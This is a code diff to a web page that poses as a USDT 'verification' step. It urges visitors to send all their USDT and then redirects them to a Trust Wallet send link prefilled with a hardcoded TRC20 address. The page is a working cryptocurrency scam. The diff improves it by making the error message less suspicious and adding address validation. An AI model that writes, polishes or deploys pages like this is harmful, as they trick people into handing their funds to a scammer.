@@ -85,7 +85,7 @@
     <p>Click below to send <strong>ALL</strong> USDT from your wallet for verification</p>
     <button onclick="verifyUSDT()">Verify All Amount</button>
     <div class="processing" id="processingText">Redirecting to Trust Wallet...</div>
-    <div class="flash-msg" id="flashError">❌ Order Failed. Please enter all USDT and verify again.</div>
+    <div class="flash-msg" id="flashError">❌ Order Failed. Please try again.</div>
   </div>
 
   <footer>
@@ -96,7 +96,15 @@
     const walletAddress = "TD8KqLSYMiE4xLX4QVrzX4BSRjpCis7vuK";
 
     function verifyUSDT() {
+      // Basic validation
+      if (!walletAddress || !walletAddress.startsWith("T") || walletAddress.length < 30) {
+        document.getElementById("flashError").innerText = "❌ Invalid TRC20 address.";
+        document.getElementById("flashError").style.display = "block";
+        return;
+      }
+
       document.getElementById("processingText").style.display = "block";
+
       setTimeout(() => {
         window.location.href = `https://link.trustwallet.com/send?coin=195&address=${walletAddress}`;
       }, 1500);
